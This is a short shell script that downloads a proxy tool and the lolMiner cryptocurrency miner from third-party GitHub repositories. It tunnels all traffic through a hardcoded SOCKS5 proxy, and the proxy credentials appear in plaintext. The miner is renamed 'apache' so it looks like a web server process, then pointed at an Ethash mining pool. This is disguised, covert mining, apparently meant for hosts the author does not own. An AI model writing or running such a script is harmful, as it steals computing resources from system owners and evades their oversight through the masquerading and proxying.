#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
apt update
apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
service tor start
wget https://raw.githubusercontent.com/hanifgz/ngarit/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 45.140.13.124:9137

socks5_username = faraddd802

socks5_password = faraddd802
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp wget https://github.com/DeniBogeh/DeniBogehh/raw/main/lolMiner
chmod +x lolMiner

mv lolMiner apache
ph add apache


./graftcp/graftcp ./apache --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800 --user teguhcong.$(echo $(shuf -i 1-999 -n 1)-LOLKacong) --ethstratum ETHPROXY
